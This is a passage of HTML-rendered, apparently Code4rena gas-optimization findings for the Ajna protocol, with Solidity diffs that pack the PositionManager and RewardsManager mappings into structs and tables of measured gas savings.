vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        screeningVotesCast[proposal_.distributionId][account_] += votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _userInfo.screeningVotesCast += uint248(votes_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit VoteCast(</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L52-L57\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L52-L57</a></p>\n<p><strong>Please note that in the <a href=\"https://gist.github.com/CloudEllie/a4655b833548ed9a86a63eb7292bcc0f#g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\">automated report</a> the <code>poolKey</code> mapping was not included in the findings</strong>.</p>\n<p><em>Gas Savings for <code>PositionManager.permit</code>, obtained via protocol’s tests: Avg 21833 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>54387</td>\n</tr>\n<tr>\n<td>After</td>\n<td>32554</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>PositionManager.burn</code>, obtained via protocol’s tests: Avg 1927 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>10451</td>\n</tr>\n<tr>\n<td>After</td>\n<td>8524</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"173\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/// @dev Mapping of `token id =&gt; ajna pool address` for which token was minted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Position</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/// @dev Mapping of `token id =&gt; nonce` value used for permit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">)                       </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nonces</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"174\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..ca903f4 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -48,13 +48,15 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*** State Variables ***/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /***********************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    /// @dev Mapping of `token id =&gt; ajna pool address` for which token was minted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mapping(uint256 =&gt; address) public override poolKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    struct TokenInfo {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address poolKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint96 nonces;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    mapping(uint256 =&gt; TokenInfo) tokenInfo;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @dev Mapping of `token id =&gt; ajna pool address` for which token was minted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(uint256 =&gt; mapping(uint256 =&gt; Position)) internal positions;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    /// @dev Mapping of `token id =&gt; nonce` value used for permit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mapping(uint256 =&gt; uint96)                       internal nonces;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @dev Mapping of `token id =&gt; bucket indexes` associated with position.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(uint256 =&gt; EnumerableSet.UintSet)        internal positionIndexes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -104,7 +106,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (!_isApprovedOrOwner(msg.sender, tokenId_)) revert NoAuth();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // revert if the token id is not minted for given pool address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (pool_ != poolKey[tokenId_]) revert WrongPool();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (pool_ != tokenInfo[tokenId_].poolKey) revert WrongPool();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -121,6 +123,10 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         erc721PoolFactory = erc721Factory_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function poolKey(uint256 tokenId_) external view returns (address) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return tokenInfo[tokenId_].poolKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /********************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*** Owner External Functions ***/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /********************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -146,8 +152,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (positionIndexes[params_.tokenId].length() != 0) revert LiquidityNotRemoved();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // remove permit nonces and pool mapping for burned token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        delete nonces[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        delete poolKey[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        delete tokenInfo[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _burn(params_.tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -172,7 +177,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        IPool   pool  = IPool(poolKey[params_.tokenId]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        IPool   pool  = IPool(tokenInfo[params_.tokenId].poolKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address owner = ownerOf(params_.tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 indexesLength = params_.indexes.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -233,7 +238,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (!_isAjnaPool(params_.pool, params_.poolSubsetHash)) revert NotAjnaPool();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // record which pool the tokenId was minted in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        poolKey[tokenId_] = params_.pool;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        tokenInfo[tokenId_].poolKey = params_.pool;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _mint(params_.recipient, tokenId_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -404,7 +409,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _getAndIncrementNonce(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 tokenId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal override returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return uint256(nonces[tokenId_]++);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return uint256(tokenInfo[tokenId_].nonces++);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -452,7 +457,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 index_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         Position memory position = positions[tokenId_][index_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return _bucketBankruptAfterDeposit(IPool(poolKey[tokenId_]), index_, position.depositTime) ? 0 : position.lps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return _bucketBankruptAfterDeposit(IPool(tokenInfo[tokenId_].poolKey), index_, position.depositTime) ? 0 : position.lps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IPositionManagerDerivedState</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -472,7 +477,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // filter out bankrupt buckets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         filteredIndexes_ = new uint256[](indexesLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 filteredIndexesLength = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        IPool pool = IPool(poolKey[tokenId_]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        IPool pool = IPool(tokenInfo[tokenId_].poolKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; indexesLength; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (!_bucketBankruptAfterDeposit(pool, indexes[i], positions[tokenId_][indexes[i]].depositTime)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 filteredIndexes_[filteredIndexesLength++] = indexes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -500,7 +505,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 index_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external view override returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return _bucketBankruptAfterDeposit(IPool(poolKey[tokenId_]), index_, positions[tokenId_][index_].depositTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return _bucketBankruptAfterDeposit(IPool(tokenInfo[tokenId_].poolKey), index_, positions[tokenId_][index_].depositTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IPositionManagerDerivedState</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -519,14 +524,14 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) public view override(ERC721) returns (string memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_exists(tokenId_));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address collateralTokenAddress = IPool(poolKey[tokenId_]).collateralAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address quoteTokenAddress      = IPool(poolKey[tokenId_]).quoteTokenAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address collateralTokenAddress = IPool(tokenInfo[tokenId_].poolKey).collateralAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address quoteTokenAddress      = IPool(tokenInfo[tokenId_].poolKey).quoteTokenAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         PositionNFTSVG.ConstructTokenURIParams memory params = PositionNFTSVG.ConstructTokenURIParams({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             collateralTokenSymbol: tokenSymbol(collateralTokenAddress),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             quoteTokenSymbol:      tokenSymbol(quoteTokenAddress),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             tokenId:               tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            pool:                  poolKey[tokenId_],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            pool:                  tokenInfo[tokenId_].poolKey,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             owner:                 ownerOf(tokenId_),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             indexes:               positionIndexes[tokenId_].values()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span></code></pre>\n<p>The instance below requires modifications to <code>IRewardsManagerState.sol</code> (out of scope) and the tests, and therefore is not included in the final diffs. I will explain this optimization for completeness: The <code>isEpochClaimed</code> nested mapping and the <code>rewardsClaimed</code> mapping are both accessed when the <code>claimRewards</code> function is called (this function invokes other internal functions that write to and read from these mappings). The same <code>tokenId_</code> that is used in the <code>isEpochClaimed</code> nested mapping is available each time <code>rewardsClaimed</code> is read from or written to. Since rewards are claimed for specific tokens, it stands to reason that both these mappings can be combined into a single nested mapping that points to a struct. We can then pack <code>rewardsClaimed</code> and <code>isEpochClaimed</code> into a single slot by changing the uint of <code>rewardsClaimed</code> to <code>uint248</code>. Doing so will allow us to avoid a <code>Gsset (20_000 gas)</code> when both values are written to and one <code>Gcoldsload (2100 gas)</code> when both values are read.</p>\n<p><strong>The diff included below is only to showcase the necessary changes needed for <code>RewardsManager.sol</code>. Those changes will not work unless <code>IRewardsManagerState.sol</code> and the tests are changed as well</strong>.</p>\n<p><strong>Please note that in the <a href=\"https://gist.github.com/CloudEllie/a4655b833548ed9a86a63eb7292bcc0f#g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\">automated report</a> the <code>isEpochClaimed</code> mapping was not included in the findings</strong>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L70-L72\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L70-L72</a></p>\n<p>Estimated Gas Savings: <code>~22100</code> (<code>Gsset (20_000 gas)</code> + <code>Gcoldsload (2100 gas)</code>)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"175\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isEpochClaimed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/// @dev `epoch =&gt; rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsClaimed</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"176\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..e7b2252 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -66,10 +66,13 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*** State Variables ***/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /***********************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    /// @dev `tokenID =&gt; epoch =&gt; bool has claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mapping(uint256 =&gt; mapping(uint256 =&gt; bool)) public override isEpochClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    /// @dev `epoch =&gt; rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mapping(uint256 =&gt; uint256) public override rewardsClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    struct EpochInfo {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint248 rewardsClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bool isEpochClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    mapping(uint256 =&gt; mapping(uint256 =&gt; EpochInfo)) epochInfo;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @dev `epoch =&gt; update bucket rate rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(uint256 =&gt; uint256) public override updateRewardsClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -99,6 +102,16 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         positionManager = positionManager_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function isEpochClaimed(uint256 tokenId_, uint256 epoch_) external view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return epochInfo[tokenId_][epoch_].isEpochClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function rewardsClaimed(uint256 tokenId_, uint256 epoch_) external view returns (uint256) {</span></span></span>\n<span 